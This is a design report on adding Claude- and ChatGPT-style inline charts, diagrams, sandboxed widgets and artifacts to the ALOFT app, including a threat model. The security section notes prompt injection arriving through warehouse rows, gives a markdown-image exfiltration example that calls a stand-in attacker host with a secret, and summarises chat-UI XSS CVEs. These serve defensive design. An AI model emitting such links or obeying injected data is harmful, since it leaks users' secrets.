# Four tiers bring Claude-grade visuals to ALOFT

Yes, ALOFT can match the ChatGPT and Claude experience. The way to get there is to copy how they constrain visuals, not to let the model write free-form HTML. Both vendors converge on four rendering tiers:

1. Markdown and diagrams rendered on the client.
2. Model-emitted chart specs drawn by built-in chart components. ChatGPT's interactive charts cover only bar, line, pie and scatter, and fall back to static images for anything else.
3. Inline HTML/SVG widgets streamed through a tool call and built up progressively. This is Claude's inline-visuals feature, shipped 12 March 2026.
4. Persistent artifacts in a cross-origin, sandboxed iframe on a separate "usercontent" domain, with a deny-by-default CSP and a postMessage bridge.

ALOFT already owns the hardest part of tier 2: a typed `ChartDSLSpec` → `validateAndRepair` → `compileSpecToOption` → tree-shaken ECharts pipeline. I confirmed that its compiler, validator and profiler are browser-safe (they import only types, `ajv` and a JSON schema). Every chat surface also funnels through one renderer, `AssistantContent` in `src/components/workbench/StreamingMessage.tsx`, so a single change there reaches Inspector, Workbench, Agents → Use, the Flows copilot and Test run together.

Four things block the experience today:

- **The renderer.** It is regex-based. It cannot see a fence until the fence closes, it rejects hyphenated languages, and it has no links.
- **Lost charts.** Inspector's `emit_chart` emits a `chart_spec` event that no client handles, and semantic charts vanish on reload.
- **Token and storage limits.** The agent loop caps output at 4,096 tokens. Agent chat persistence drops every message field except `content`.
- **Security.** The app CSP restricts neither scripts nor styles, so any careless `dangerouslySetInnerHTML` of model SVG would run with full warehouse-session privileges.

The recommended design makes **fenced blocks in `content` the single persisted format for visuals** (`aloft-chart`, `mermaid`, `svg`, later `aloft-widget`). There are two producers. The model can write a fence directly, or it can call a server-validated `render_chart` tool whose output the server writes into the text stream as a fence. Persistence, history replay, Copy and every surface then work without a schema migration. That supports a five-phase rollout: renderer foundation, inline charts, diagrams/SVG/markdown quality, sandboxed widgets, then artifacts on a separate domain. Charts can reach users within roughly the first month. Arbitrary JavaScript should not run anywhere until the iframe sandbox and bridge exist.

## Claude and ChatGPT win through constraint, isolation and streaming discipline

The best-in-class experience is not one feature. It is a ladder of surfaces, each matched to how much the model is trusted and how long the output should live. The patterns below are what ALOFT should copy.

### Claude: artifacts in a side panel, inline visuals in the message

Claude's original **Artifacts** system (2024–2025) emitted XML-like tags in the streamed text. Each tag carried a reusable kebab-case `identifier`, a `title` and a MIME-like `type`. There were six types: code, markdown, HTML, SVG, Mermaid (`application/vnd.ant.mermaid`) and React (`application/vnd.ant.react`) ([dazeb gist](https://gist.github.com/dazeb/f41920dcb9cb8faba6803e821b600e8d)). The leaked prompt sets a high bar for creating one. It must be **"substantial content (>15 lines)"** that the user is likely to reuse, and **"if unsure, don't create an artifact."** An update reuses the identifier and repeats the full content ([dazeb gist](https://gist.github.com/dazeb/f41920dcb9cb8faba6803e821b600e8d)). React artifacts got a fixed library set: lucide-react, recharts and shadcn/ui, with "NO OTHER LIBRARIES … ABLE TO BE IMPORTED" ([dazeb gist](https://gist.github.com/dazeb/f41920dcb9cb8faba6803e821b600e8d)). That restriction is the main reason they rarely break.

By 2026 each artifact is served from its own origin, `<uuid>.frame.claudeusercontent.com`, so "two artifacts cannot see each other." It runs under a CSP of the form `default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:; connect-src 'self' …`. Third-party tests found that fetch, XHR, WebSocket, image beacons and sendBeacon were all blocked ([Pluto Security](https://pluto.security/blog/inside-claude-artifacts-how-your-agent-publishes-to-the-web/)). Privileged calls such as `window.claude.complete()` and connector access go through the parent page under the viewer's session. The in-frame stub holds no token ([Pluto Security](https://pluto.security/blog/inside-claude-artifacts-how-your-agent-publishes-to-the-web/); [Simon Willison](https://simonwillison.net/2025/jun/25/ai-powered-apps-with-claude)). Artifact runtime errors are **not** sent back to the model automatically ([Simon Willison](https://simonwillison.net/2025/jun/25/ai-powered-apps-with-claude)).

On **12 March 2026** Anthropic shipped **inline visuals**: charts, diagrams and interactive explainers drawn inside the message. The feature is on by default for all plans ([Claude blog](https://claude.com/blog/claude-builds-visuals)). Anthropic frames the split clearly. Artifacts are permanent and shareable. Visuals "appear in-line … and they're temporary" ([Claude blog](https://claude.com/blog/claude-builds-visuals)).

Reverse engineering shows a two-tool protocol ([Michael Livshits](https://michaellivs.com/blog/reverse-engineering-claude-generative-ui/)):

- **Step 1: `read_me(modules=[...])`.** This loads design guidelines on demand. The modules are diagram, chart, interactive, mockup and art, and run about 17–59K characters each.
- **Step 2: `show_widget(widget_code=…)`.** The `widget_code` is an HTML fragment that streams as JSON string chunks. The client parses the partial HTML and inserts nodes incrementally.

Several runtime rules support that protocol ([Michael Livshits](https://michaellivs.com/blog/reverse-engineering-claude-generative-ui/)):

- **Scripts run only after streaming completes.** Libraries come from an allow-listed CDN.
- **`loading_messages`** supplies 1–4 strings shown while the widget renders.
- **`sendPrompt()`** lets a click post a follow-up message.
- **The design system is deliberately minimal:** host CSS variables, two font weights, mandatory dark mode, and no gradients, shadows or HTML comments, because those "flash during DOM updates."

Sources conflict on whether the widget runs in an iframe. Livshits infers the parent DOM; a dev.to author who inspected network traffic says iframe ([dev.to](https://dev.to/navayuvan/i-reverse-engineered-claudes-ui-widget-and-it-changed-how-i-think-about-building-llm-apps-483f)). Anthropic has published no technical documentation. Quality also depends on the model: under identical instructions, Opus was "significantly better" than Sonnet 4.6 ([dev.to](https://dev.to/navayuvan/i-reverse-engineered-claudes-ui-widget-and-it-changed-how-i-think-about-building-llm-apps-483f)).

### ChatGPT: three separate visual surfaces

**Canvas** is a side editor that renders React/HTML "in a sandbox environment." Network access for that code is an admin toggle, off by default in enterprise workspaces ([OpenAI Help](https://help.openai.com/en/articles/9930697)).

**Interactive charts** from data analysis are interactive only for **bar, line, pie and scatter**. Every other type comes back as a static image ([OpenAI Help](https://help-lb.openai.com/en/articles/8437071-data-analysis-with-chatgpt); [OpenAI Help 9213685](https://help.openai.com/en/articles/9213685)). In other words, the ChatGPT chart experience is a small, fixed set of trusted components fed by data. It is not model-written rendering code.

**Apps SDK widgets** are HTML templates (`text/html;profile=mcp-app`, `ui://` URIs) rendered in sandboxed iframes on `web-sandbox.oaiusercontent.com` ([Apps SDK Reference](https://developers.openai.com/apps-sdk/reference.md)). Several design details are worth copying:

- **A three-channel result.** `structuredContent` goes to the model and the UI, `content` carries text, and `_meta` goes to the UI only.
- **Status labels.** Short `invoking`/`invoked` strings of at most 64 characters.
- **Sizing.** `notifyIntrinsicHeight` lets the widget report its height.
- **Display modes.** Inline, fullscreen or picture-in-picture.
- **Closing the loop.** `sendFollowUpMessage` lets the widget post into the conversation.

This model became the **MCP Apps** standard (SEP-1865, final January 2026). It makes sandboxed iframes mandatory and requires the host and sandbox to have different origins ([SEP-1865](https://modelcontextprotocol.io/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp); [MCP Apps spec](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)). Google sits at the far end of the trade-off. Gemini's "dynamic view" codes a full custom page per prompt and rates close to expert-designed sites, but it "can sometimes take a minute or more" to generate ([Google Research](https://research.google/blog/generative-ui-a-rich-custom-visual-interactive-user-experience-for-any-prompt/)).

| Tier | Claude | ChatGPT | ALOFT equivalent (proposed) |
|---|---|---|---|
| 1. Markdown, tables, diagrams | Mermaid as an artifact type | Markdown and tables | `AssistantContent` plus a lazy `MermaidBlock` |
| 2. Data charts from specs | React artifacts with recharts | Four interactive chart types, static fallback | `aloft-chart` spec → existing ChartDSL → ECharts |
| 3. Inline interactive widgets | `show_widget`, streamed HTML/SVG, scripts last | Apps SDK inline display mode | `aloft-widget` in a sandboxed iframe with a bridge |
| 4. Persistent artifacts | Side panel, per-artifact origin, fixed libraries | Canvas, fullscreen widgets | Side panel on a separate registrable domain, versioned by id |

The lesson is that the polish comes from constraint and isolation, not from model freedom. The constraints are fixed chart types, fixed libraries, a small design system, on-demand guideline loading and scripts-last streaming. The isolation is cross-origin iframes with no network access. ALOFT should build tiers 1–2 first. The marginal quality gain is largest there and the security cost is smallest.

## ALOFT already owns half the pipeline, but one regex renderer gates every surface

### One renderer serves every surface

All assistant prose goes through `AssistantContent`, which is re-exported from `src/components/chat/AssistantContent.tsx` and implemented in the 1,461-line `StreamingMessage.tsx` ([StreamingMessage.tsx](../src/components/workbench/StreamingMessage.tsx)). It splits text with `/```(\w+)?\s*\n([\s\S]*?)```/g` (line 1272, re-verified for this report). That has three consequences:

- **A fence still streaming renders as prose** until its closing backticks arrive.
- **Hyphenated languages never match.** Tags like `aloft-chart` or `vega-lite` fall through.
- **`fencedBlock()` ignores the language.** It routes any `{`/`[` payload to the JSON-table renderer ([StreamingMessage.tsx:1196-1201](../src/components/workbench/StreamingMessage.tsx)), so a chart spec in a ```` ```json ```` fence would show up as a table today.

`renderInline` handles only bold, italic and inline code: no links, images or strikethrough ([StreamingMessage.tsx:348-366](../src/components/workbench/StreamingMessage.tsx)). List regexes are anchored at the start of the line, so nested lists render flat ([StreamingMessage.tsx:542-613](../src/components/workbench/StreamingMessage.tsx)). The consumers are `PromptCanvas` (Inspector and Workbench), `views/agent-lab/agents/use.tsx:706`, `CopilotPanel.tsx:143` and `TestRunSection.tsx:255`. `SessionCockpit` shows transcripts as pre-wrapped plain text and would show raw fence source ([SessionCockpit.tsx:37](../src/components/agent-ops/SessionCockpit.tsx)).

### Streaming and persistence vary by surface

Streaming is hand-rolled SSE everywhere: `data: {json}\n\n` frames from a `ReadableStream`, read on the client with `getReader()`. Tool lifecycle events are already a first-class side channel ([agents/chat/route.ts:131-223](../src/app/api/agent-lab/agents/chat/route.ts); [useInspectorChat.ts:301-690](../src/hooks/useInspectorChat.ts)). Persistence differs by surface:

- **Inspector.** The whole client `WorkbenchMessage[]` is PATCHed into `workbench_sessions.messages` (Prisma `Json?`) without validation ([workbench/sessions/[id]/route.ts](../src/app/api/agent-lab/workbench/sessions/[id]/route.ts)).
- **Agents → Use.** `parseChatMessages` rebuilds each message from only `id/role/content/timestamp/inspection`, so any new field is silently dropped on read. History sent back to the model is capped at **30 messages / 60,000 characters** and uses `content` only ([agent-chats.ts](../src/lib/agents/agent-chats.ts)).
- **Agents → Use stream.** The client gets `tool_call_result` without `output`, so it cannot build a chart from tool data unless the server sends one ([agents/chat/route.ts](../src/app/api/agent-lab/agents/chat/route.ts)).
- **Output cap.** The Bedrock loop sets `maxTokens: 4096`, which is a hard ceiling on any visual the model writes inline ([agent-loop.ts:174](../src/lib/inspector/agent-loop.ts)).

Two existing bugs show that chart output has no first-class home yet. **`emit_chart` emits `chart_spec`, but `useInspectorChat` has no case for it** ([tools.ts:234](../src/lib/inspector/tools.ts); [useInspectorChat.ts:341-690](../src/hooks/useInspectorChat.ts)). **Semantic charts live in a separate `semanticChartMessages` state that is never rehydrated**, so they disappear on reload ([useInspectorChat.ts:209-270](../src/hooks/useInspectorChat.ts)).

### The chart stack is already in place

The asset ALOFT should build on is the Studio chart stack:

- **`ChartDSLSpec`** has nine kinds and role-based encodings ([chart-dsl.ts](../src/lib/studio/chart-dsl.ts)).
- **A JSON schema, `validateAndRepair`, and `compileSpecToOption`** take the spec to an ECharts option ([compiler.ts:436-461](../src/lib/studio/compiler.ts)).
- **`echartsCore.ts`** is the single entry point for ECharts. It registers bar, line, pie, scatter and heatmap charts, both the canvas **and SVG** renderers, and the four ALOFT/inspector themes. It does **not** register boxplot, even though the DSL allows it ([echartsCore.ts](../src/lib/studio/echartsCore.ts)).
- **`StudioChart`** already lazy-loads `echarts-for-react` and switches theme with `useIsDark()` ([StudioChart.tsx](../src/components/studio/StudioChart.tsx)).

`compiler.ts` and `profiler.ts` import only types, and `validator.ts` imports only `ajv` and the schema JSON. **The whole pipeline can run in the browser** without tripping the `web:check-bundle` server-marker guard ([check-bundle.mjs](../web/e2e/check-bundle.mjs)).

### Platform constraints

- **Vite SPA.** The UI is a Vite + React Router 7 SPA in `/web` on **React 18.3.1**. Next 16.4.2 serves only `/api/**` and the SPA shell ([next.config.ts](../next.config.ts)). Next's `next/dynamic` and server-component advice does not apply; heavy renderers load with `React.lazy`/`import()`. React-19-only libraries are out. That includes `@json-render/react`, which needs `react ^19.2.3` ([npm](https://registry.npmjs.org/@json-render/react)).
- **No sandbox or sanitizer yet.** Global headers send `X-Frame-Options: DENY` and a CSP limited to `frame-ancestors 'none'; base-uri 'self'; object-src 'none'`. No DOMPurify, markdown library, highlighter, Mermaid or iframe exists anywhere in the UI ([next.config.ts:25-42](../next.config.ts)).
- **Typography guard.** It fails CI if inline font sizes, letter-spacing, weights of 700/800 or non-Inter/IBM Plex Mono families grow past `typography-baseline.json`. It scans template strings in `.ts/.tsx` too ([typography-guard.test.ts](../src/lib/typography/__tests__/typography-guard.test.ts)).
- **Tailwind 3.** The repo is on Tailwind `^3.4.17` (package.json, re-verified). Streamdown's documented setup targets Tailwind v4 `@source` lines ([streamdown llms.txt](https://streamdown.ai/llms.txt)), so it would need adapting.

The answer to "can we" is yes. Tiers 1 and 2 are mostly wiring existing parts together. Tiers 3 and 4 need net-new security infrastructure that ALOFT does not have today.

## One fence format carries every visual from model to database

### Architecture: fences in `content` as the single persisted format

The central decision is how a visual travels from model to screen to database. There are three options:

- **Fenced blocks in the text.** They are portable across Bedrock, Foundry, xAI and LLM Lite. They stream naturally and persist for free.
- **A dedicated tool.** It gives a JSON schema, clean stream boundaries and an `is_error` channel for self-repair, at the cost of an extra turn.
- **JSON UI specs (A2UI, json-render).** These are heavier and pre-1.0 ([A2UI](https://github.com/google/A2UI)).

The research consensus is fences for Mermaid and short SVG, and a validated tool for data charts, because "provenance and validation matter" for data ([Anthropic fine-grained tool streaming](https://platform.claude.com/docs/en/agents-and-tools/tool-use/fine-grained-tool-streaming); [VisEval](https://arxiv.org/html/2407.00981v2)).

The plan adopts both producers but **one storage format**. When the model calls `render_chart`, the server validates the input, resolves the data and writes a canonical ```` ```aloft-chart ```` fence into the text stream as an ordinary `text` event at that point in the answer. The persisted assistant `content` is therefore always self-describing markdown. That buys five things:

- **`parseChatMessages` needs no change.** Its `content`-only shape and the `appendAgentChatMessages` JSONB append keep working.
- **Inspector charts survive reload**, which fixes the `semanticChartMessages` bug.
- **Copy, SessionCockpit and the non-streaming Flows copilot** get the same representation.
- **Agents → Use does not need `tool_call_result` output** to reach the client.
- **The inspection side channel is not disturbed.** It stays as the precedent for hidden structured data ([run-catalog-agent.ts](../src/lib/agents/run-catalog-agent.ts)).

Large or versioned payloads (Phase 4 artifacts) are the exception. They go by reference (```` ```aloft-artifact {"ref":"art_…","version":3} ````) to a new table, because full HTML in `content` would blow through the 60k history budget.

```
 model ──text──────────────────────────────┐
   │  writes ```mermaid / ```svg / ```aloft-chart directly
   │                                         ▼
   └─tool_use render_chart ─► server: zod validate → resolve data_ref
                              → cap rows → serialize fence ─► emit {type:'text'}
                                                             │
 SSE text deltas ─► client block tokenizer (open-fence aware) ─► VisualBlock registry
                                                             │      ├ InlineChart  (ECharts, lazy)
 persisted: workbench_sessions.messages[].content (markdown)  │      ├ MermaidBlock (lazy, strict)
 replayed to model: content with visual payloads compacted ◄──┘      ├ SafeSvg      (DOMPurify)
                                                                     └ SandboxedWidget (iframe, Phase 3)
```

| Visual | Emission | Rationale |
|---|---|---|
| Data chart from tool results | `render_chart` tool (preferred) or `aloft-chart` fence | Server checks schema and provenance and returns `is_error` for repair. Data is referenced, not retyped. |
| Small illustrative chart (no tool data) | `aloft-chart` fence with inline `data` | Works on every provider and surface, including the copilot. |
| Flow, sequence or architecture diagram | `mermaid` fence | Models know the syntax. `mermaid.parse` gates rendering. |
| Static illustration or icon-style diagram | `svg` fence | Sanitized and inline. Interactivity limited to CSS hover and `<title>` tooltips. |
| Interactive explainer (sliders, toggles) | `aloft-widget` fence or `show_widget` tool (Phase 3) | Needs JavaScript, so it must be isolated. |
| Reusable deliverable | `create_artifact`/`update_artifact` tool (Phase 4) | Versioned by identifier, side panel, download. |

### Chart spec: a small semantic layer over the existing ChartDSL

Do not let the model write raw ECharts `option` objects. They are large and permissive, formatter strings invite `eval`, and unregistered series types fail silently (an inference from the research synthesis, not a measured result). Do not add Vega-Lite either. It would be a third chart stack next to ECharts and the Recharts-based `DashboardPane`, at roughly 290 KB gzip for vega, vega-lite and vega-embed ([npm vega-lite](https://registry.npmjs.org/vega-lite); [bundlephobia vega](https://bundlephobia.com/package/vega)).

The benchmark evidence favors a simple intermediate spec. In VisEval, GPT-4's invalid rate rose from **3.29% on Matplotlib to 25.41% on Seaborn**, so the grammar the model targets matters a great deal. For strong models, *illegal* output (wrong aggregation, mapping or sort, 21.44%) dominates over invalid syntax ([VisEval, arXiv 2407.00981](https://arxiv.org/html/2407.00981v2)). Flint found that a semantic intermediate language compiling to Vega-Lite beats raw Vega-Lite, "and the advantage grows as model capability decreases" ([Flint, arXiv 2607.20775](https://arxiv.org/pdf/2607.20775)). That matters for ALOFT's non-Anthropic model options. DracoGPT measured only **19.10% valid Vega-Lite** from GPT-3.5 ([arXiv 2408.06845](https://arxiv.org/pdf/2408.06845)).

`AloftChartSpec v1` lives in a new client-safe module, `src/lib/visuals/spec.ts` (zod). Its key order is deliberate: layout-determining fields come first, so a partial parse can size the skeleton, and data comes last ([streaming notes](https://pub.dev/packages/stream_struct)).

```json
{
  "v": 1,
  "kind": "bar",
  "title": "Pipeline value by region, Q3 2026",
  "summary": "EMEA leads at $4.2M; APAC grew fastest (+18% QoQ).",
  "height": 280,
  "x": { "field": "region", "type": "nominal", "sort": "-y" },
  "y": [{ "field": "value", "label": "Pipeline value", "format": "currency:USD" }],
  "series": null,
  "source": { "toolCallId": "tooluse_9f2c" },
  "data": [{ "region": "EMEA", "value": 4200000 }, { "region": "APAC", "value": 3100000 }]
}
```

The rules for the spec are as follows.

**Kinds.** `kind` is restricted to the ChartDSL kinds that are actually registered: `bar | stacked-bar | line | area | pie | scatter | heatmap | histogram`, plus `boxplot` once `BoxplotChart` is added to `echartsCore.ts`.

**Fields.** `summary` is **required**, because it doubles as the accessible description.

**Data limits.** `data` is capped at 500 rows and 64 KB. These are proposed limits to tune.

**Client path.** A new `src/lib/visuals/chart-adapter.ts` does four things:

1. Profiles `data` with the existing `profiler.ts` to get a `ProfileResult`.
2. Maps `x`/`y`/`series` to `ChartEncoding {columnId: field, role}`.
3. Runs `validateAndRepair`.
4. Calls `compileSpecToOption(spec, profile, rows, theme)`.

Inline chat charts thus reuse the exact compiler Inspector and Studio use.

**Tool path.** The server-side `render_chart` tool lives in a new server-only module, `src/lib/visuals/render-chart-tool.ts`, imported by `run-catalog-agent.ts` and the Inspector tool config. It accepts the same fields but takes `data_ref: {tool_call_id, rows_path?, columns?}` instead of retyped `data`. The server resolves rows from that turn's tool results. Referencing data cuts output tokens against the 4,096 cap and removes the hallucinated-data failure mode. That follows from VisEval's finding that illegal data transformation dominates, which argues for aggregating in SQL and charting already-aggregated rows ([VisEval](https://arxiv.org/html/2407.00981v2)).

**Repair.** Validation failures return `is_error` tool results with zod issue paths. That is Anthropic's documented repair pattern ([Anthropic docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/fine-grained-tool-streaming)).

**Inspector.** `emit_chart` / `emit_semantic_chart` should also materialize an `aloft-chart` fence, which closes the dead `chart_spec` path. The right-hand Results pane can keep its richer cards.

### Diagram, SVG, widget and artifact specs

**Mermaid** fences render through a lazy `MermaidBlock`, in four steps:

1. Debounce `mermaid.parse(code, {suppressErrors: true})` once the fence closes.
2. Call `render()` only on success, and keep the last good SVG on screen.
3. Use the `base` theme with `themeVariables` built from tokens and `darkMode` set to match ([Mermaid theming](https://mermaid.js.org/config/theming.html); [Mermaid usage](https://mermaid.js.org/config/usage.html)).
4. Keep `securityLevel: 'strict'` and `htmlLabels: false`.

**SVG** fences render through `SafeSvg` (below). Theming in model SVG works through `currentColor` and a fixed class vocabulary defined in host CSS under `.aloft-visual svg`, for example `v-ink`, `v-muted`, `v-accent`, `v-c1…v-c6` and `v-hover`. Classes outside the vocabulary are stripped. This is the same idea as Claude's host-supplied CSS variables ([Livshits](https://michaellivs.com/blog/reverse-engineering-claude-generative-ui/)).

**`aloft-widget`** (Phase 3) is an HTML fragment with no doctype, html, head or body tags, with scripts last, mirroring `show_widget`. Optional metadata goes in a first-line JSON header: `title`, `height` and `loading` (up to 4 strings).

**Artifacts** (Phase 4) follow Claude's identifier model. `create_artifact({identifier, title, type: 'html'|'react'|'svg'|'markdown'})` and `update_artifact` always send full content and never a truncated "rest unchanged" ([dazeb gist](https://gist.github.com/dazeb/f41920dcb9cb8faba6803e821b600e8d)). They are stored in a new `chat_artifacts` table (id, session id, message id, identifier, version, type, source, created_by), migrated with Prisma 5.22.

### Component and file map

| Layer | File (new or changed) | Responsibility |
|---|---|---|
| Spec | `src/lib/visuals/spec.ts` (new, client-safe) | Zod schemas for `AloftChartSpec`, fence metadata and size limits. Shared by client and server. |
| Tokenizer | `src/lib/visuals/blocks.ts` (new) | Splits content into blocks, flags an open trailing fence, language regex `[\w-]+`, content hash per block. |
| Renderer | `StreamingMessage.tsx` `AssistantContent` / `fencedBlock` (changed) | Dispatch by language before the JSON-table fallback. Per-block `React.memo`. Links in `renderInline`. |
| Frame | `src/components/chat/visuals/VisualBlock.tsx` (new) | Registry, error boundary, `<figure>`, toolbar (copy source, download SVG/PNG, view data, expand), skeleton, error card with "Fix this". |
| Charts | `InlineChart.tsx`, `src/lib/visuals/chart-adapter.ts` (new) | Spec → profiler → ChartDSL → `compileSpecToOption` → lazy ECharts via `echartsCore`. |
| Diagrams | `MermaidBlock.tsx` (new) | Lazy Mermaid, parse gate, theme vars, sanitize output, SVG cache keyed by (hash, theme). |
| SVG | `SafeSvg.tsx`, `src/lib/visuals/sanitize-svg.ts` (new) | The **only** allowed `dangerouslySetInnerHTML` site for model markup. |
| Theme | `src/lib/visuals/theme-runtime.ts` (new) | Reads `getComputedStyle` tokens, including the user accent from `applyAppearance`. Builds the ECharts theme, Mermaid vars and sandbox token map. Subscribes to theme and appearance changes. |
| ECharts | `src/lib/studio/echartsCore.ts` (changed) | Register `AriaComponent`, `BoxplotChart` and `MarkLineComponent`. |
| Widgets | `SandboxedWidget.tsx`, `src/lib/visuals/bridge.ts`, `web/sandbox/runtime.ts` (new) | Iframe, zod-validated postMessage protocol, in-frame runtime (tokens, resize, morphdom streaming, error reporting). |
| Server tool | `src/lib/visuals/render-chart-tool.ts` (new, server-only) | Tool definition, `data_ref` resolution, provenance check, fence serialization. |
| Prompts | `src/lib/inspector/answer-rules.ts` (changed), `prompts.ts`, `construction/prompts.ts` | `VISUAL_RESPONSE_RULES`, gated by surface. |
| Stream hygiene | `agent-loop.ts` `stripInspectorMarkup`, `useInspectorChat.ts` `sanitize` (changed) | Skip fenced regions, so comments and tags inside SVG/HTML fences survive. |
| History | `src/lib/agents/agent-chats.ts`, Inspector history mapper (changed) | Compact visual payloads in model history, e.g. `[chart: <title>, 24 rows]`. |
| Transcript | `SessionCockpit.tsx` (changed) | Switch to `AssistantContent`. |

### Streaming partial rendering

The tokenizer has to recognize an **unclosed trailing fence**, which the current regex cannot. While a fence is open, `VisualBlock` shows a fixed-height skeleton labelled by language, such as "Drawing chart…" or "Drawing diagram…". Its height comes from a best-effort parse of `height`, or a per-kind default, so nothing shifts when the visual resolves.

This is the same contract as Streamdown's `useIsCodeFenceIncomplete`, which exists "to defer expensive renders such as syntax highlighting and Mermaid until the block is complete" ([Streamdown releases](https://releasebot.io/updates/vercel/streamdown)). Expensive renderers run once on close and are cached by content hash. Earlier blocks are memoized, so only the growing last block re-renders.

Charts produced by the tool path arrive as one `text` event and never stream partially. That matters because Bedrock Converse buffers tool input. Without `eager_input_streaming`, "nothing prints for a large parameter until Claude has finished generating it," and no AWS documentation confirms that the flag passes through Converse ([Anthropic docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/fine-grained-tool-streaming); [AWS Bedrock](https://docs.aws.amazon.com/bedrock/latest/userguide/model-parameters-anthropic-claude-messages-tool-use.html)). The existing `tool_call_running` event should therefore carry a 64-character-or-shorter status label ("Building revenue chart…"), the equivalent of ChatGPT's `invoking` string ([Apps SDK Reference](https://developers.openai.com/apps-sdk/reference.md)).

A truncated stream must not render as finished. Partial-JSON repair "can end normally with whatever partial value had accumulated" ([stream_struct](https://pub.dev/packages/stream_struct)). The client should finalize a visual only on fence close plus the `done` event, and show "Visual incomplete — response was cut off" when `done.outcome` signals a `max_tokens` stop.

Widgets (Phase 3) stream like Claude's, following the pi-generative-ui recipe:

1. Debounce chunks by 150 ms.
2. Post them into the frame runtime, which applies them to `#root` with a vendored morphdom.
3. Re-create `<script>` tags only on completion.

The recipe's authors report that `innerHTML` replacement and naive appends failed ([Livshits](https://michaellivs.com/blog/reverse-engineering-claude-generative-ui/); [pi-generative-ui](https://github.com/Michaelliv/pi-generative-ui)).

### Prompt guidance at the shared injection point

Add `VISUAL_RESPONSE_RULES` to `src/lib/inspector/answer-rules.ts` and reference it beside `ANSWER_COMPLETENESS_RULES`. It goes in `INSPECTOR_SYSTEM_PROMPT`, `INSPECTOR_WAREHOUSE_ONLY_PROMPT` and `buildRuntimeSystemPrompt` ([answer-rules.ts](../src/lib/inspector/answer-rules.ts); [prompts.ts](../src/lib/inspector/prompts.ts); [construction/prompts.ts:76-118](../src/lib/construction/prompts.ts)). There are three caveats:

- **Gate it by surface.** `buildRuntimeSystemPrompt` also serves `surface:'automation'`, where nobody sees the output ([flows/agent-try/route.ts](../src/app/api/agent-lab/flows/agent-try/route.ts)).
- **Reconcile it with `AGENT_ANSWER_VOICE`.** That rule says "Put records in a markdown table," which conflicts unless the new rule states that tables stay the default for record lists.
- **In Inspector, prefer the data-bound tools.** The rule must tell the model to use `emit_chart`/`emit_semantic_chart` when warehouse data is involved, so it does not produce duplicate charts.

Draft wording, about 1.2K characters, adapted from the research "show, don't tell" rules ([VisEval](https://arxiv.org/html/2407.00981v2); [dazeb gist](https://gist.github.com/dazeb/f41920dcb9cb8faba6803e821b600e8d)):

```
## VISUALS
Use a visual only when its structure carries the meaning: comparing 3+ values, a trend over time,
a distribution, part-to-whole, a process of 4+ steps, or relationships/architecture.
Use prose or a markdown table for a single number, <3 data points, yes/no answers, record lists,
or when the user asked for brevity. At most one visual per answer unless asked.
Charts of tool data: call render_chart with data_ref to the tool result; never retype, invent,
or estimate numbers. Aggregate in the query, not in the chart.
Diagrams: a ```mermaid block that starts with accTitle: and accDescr: lines.
Always write 1–2 sentences stating the takeaway next to the visual. If data is missing, say so.
If unsure, do not draw.
```

Claude keeps detailed design guidance out of the system prompt and loads it on demand per module through `read_me` ([Livshits](https://michaellivs.com/blog/reverse-engineering-claude-generative-ui/)). ALOFT should do the same. The always-on rule stays short. Per-kind detail (palette classes, SVG vocabulary, widget rules) lives in the `render_chart` / `show_widget` tool descriptions, or in a `visual_guidelines` tool once widgets arrive. Because widget quality varies sharply by model ([dev.to](https://dev.to/navayuvan/i-reverse-engineered-claudes-ui-widget-and-it-changed-how-i-think-about-building-llm-apps-483f)), gate widget rules by model capability in the provider factory. Weaker providers get charts and Mermaid only.

**Self-repair.** For tool calls, return `is_error`. For fences, the error card offers "Fix this", which sends a hidden follow-up ("The ```mermaid block failed to parse at line N: … Re-emit only the corrected block."). Cap it at one or two retries, then show the source. Neither vendor feeds errors back automatically; Claude explicitly does not ([Simon Willison](https://simonwillison.net/2025/jun/25/ai-powered-apps-with-claude)). That leaves room for ALOFT to differentiate.

## Every model byte is attacker-controlled: the security model

### Why this matters more for ALOFT

The threat model is sharper for ALOFT than for consumer chat. The app origin holds a next-auth session that can query warehouses. Retrieved warehouse rows can carry prompt injection. Today's CSP leaves scripts unrestricted, so **any unsanitized model markup in the DOM executes with the user's full privileges**.

The history of open-source chat UIs shows that the markdown and preview paths are where these bugs land:

- **Open WebUI CVE-2025-46719.** Unsanitized HTML tokens allowed an `<iframe onload>` to steal tokens ([OSV](https://osv.dev/vulnerability/CVE-2025-46719)).
- **LibreChat CVE-2026-54025.** `marked` did not escape quotes in image alt text inside the *artifact preview* ([OSV](https://osv.dev/vulnerability/CVE-2026-54025)).
- **Mermaid's 2026 batch** (CVE-2026-41148/41149/41159, fixed in 10.9.6/11.15.0). It included CSS injection that "escapes diagram scoping and restyles the whole page," which is a phishing primitive ([SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-41159/); [releasealert](https://releasealert.dev/cve/CVE-2026-41149)).
- **Exfiltration needs no script.** A markdown image `![](https://attacker/?q=<secret>)` leaks on render. OpenAI's `url_safe` check was bypassed twice ([Tenable TRA-2025-06](https://www.tenable.com/security/research/tra-2025-06); [Simon Willison](https://simonwillison.net/tags/markdown-exfiltration)).

### Sanitize passive content, isolate anything that executes

The rule is to **sanitize content that is only displayed, and isolate anything that runs code**.

| Block | Where it renders | Controls |
|---|---|---|
| Markdown prose, links | App DOM, React elements (no HTML pass-through) | No raw HTML. Links limited to `https:`/`mailto:`, with `rel="noopener noreferrer nofollow"`, `referrerpolicy="no-referrer"`, a visible hostname and a confirm step for unlisted hosts. **No remote images from model output.** |
| `aloft-chart` | App DOM via ECharts | Data-only zod spec. No formatter strings, no `eval`. Only registered series. |
| `mermaid` | App DOM (Phase 2), sandbox later if needed | `strict`, `htmlLabels:false`, pinned at ≥11.15.0 or 12.2.x. Output passed through a Mermaid DOMPurify profile. |
| `svg` | App DOM via `SafeSvg` | DOMPurify SVG profile, size and node caps, class vocabulary. |
| `aloft-widget`, artifacts | Sandboxed iframe only | Opaque origin, meta CSP, `connect-src 'none'`, bridge. |

